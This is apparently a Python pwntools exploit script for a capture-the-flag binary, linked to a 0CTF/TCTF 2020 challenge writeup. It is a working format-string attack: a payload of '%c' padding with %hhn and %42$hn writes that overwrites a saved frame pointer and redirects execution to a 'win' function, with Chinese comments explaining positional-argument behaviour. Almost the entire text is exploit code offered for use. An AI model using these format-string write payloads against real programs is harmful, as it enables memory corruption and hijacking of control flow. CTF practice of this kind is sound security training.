# https://github.com/hzqmwne/my-ctf-challenges/blob/master/0CTF_TCTF-2020-Quals/simple_echoserver/writeup/writeup_zh.md
# encoding: utf-8
from pwn import *

r = process('./rbp')

win = 0x4006a7
# 遇到第一個 $ 後, 會將後面參數一併填入
# 也就是說, %7$s %7$n %7$s 會印出兩次相同位址的值
# 但 (%c)*6 %n %7$s 會印出修改後的位址的值

# rbp 在 %40$
payload = '%c'*38+'%{}c'.format(0x58-38)+'%hhn'+'%{}c'.format(0x6a8-0x58)+'%42$hn'
#gdb.attach(r, 'b *0x40070d\nc')
r.sendlineafter(':', payload)
r.interactive()